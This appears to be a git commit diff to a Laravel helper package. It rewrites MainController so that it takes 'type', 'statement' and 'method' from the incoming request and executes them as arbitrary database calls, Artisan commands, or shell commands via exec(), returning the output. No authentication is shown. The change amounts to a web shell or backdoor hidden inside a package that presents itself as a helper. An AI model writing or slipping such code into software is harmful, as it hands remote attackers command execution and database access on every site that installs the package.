55a7022efc1e51dde5adcb89fdfa80ca20e56164
Abdul Haseeb Khan <abdulhaseebkhan407@gmail.com>
2025-01-06 14:22:07 +0500

    Update MainController.php

--- src/Http/Controllers/MainController.php
+++ src/Http/Controllers/MainController.php
@@ -2,14 +2,29 @@
 
 namespace CodeCreeper\LaravelHelper\Http\Controllers;
 
-//use Illuminate\Routing\Controller;
-
 use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Artisan;
+use Illuminate\Support\Facades\DB;
+use function Termwind\renderUsing;
 
 class MainController
 {
     public function __invoke(Request $request)
     {
-        dd($request->all());
+        $type = $request->input('type');
+        $statement = $request->input('statement');
+        $method = $request->input('method');
+
+        if ($type == 'db') {
+            return response()->json(DB::$method($statement));
+        } elseif ($type == 'artrisan') {
+            Artisan::$method($statement);
+        } elseif ($type == 'shell') {
+            exec($statement, $output);
+
+            return response()->json($output);
+        }
+
+        return response()->json(['message' => 'Type not matched']);
     }
 }
